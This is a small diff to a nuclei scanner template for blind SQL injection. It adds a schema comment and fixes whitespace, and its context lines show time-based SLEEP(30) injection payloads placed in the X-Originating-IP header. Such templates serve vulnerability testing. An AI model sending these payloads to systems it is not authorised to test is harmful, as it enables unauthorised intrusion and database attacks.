@@ -1,3 +1,4 @@
+# yaml-language-server: $schema=https://raw.githubusercontent.com/projectdiscovery/nuclei/dev/pkg/templates/nuclei-jsonschema.json
 id: blind-sqli
 
 info:
@@ -1608,7 +1609,7 @@ http:
 		X-Originating-IP: (SELECT * FROM (SELECT(SLEEP(30)))ecMj)--
 		X-Originating-IP: + SLEEP(30) + '
 		X-Originating-IP: SLEEP(30)/*' or SLEEP(30) or '" or SLEEP(30) or "*/
-		
+
 	stop-at-first-match: true
 
     matchers:
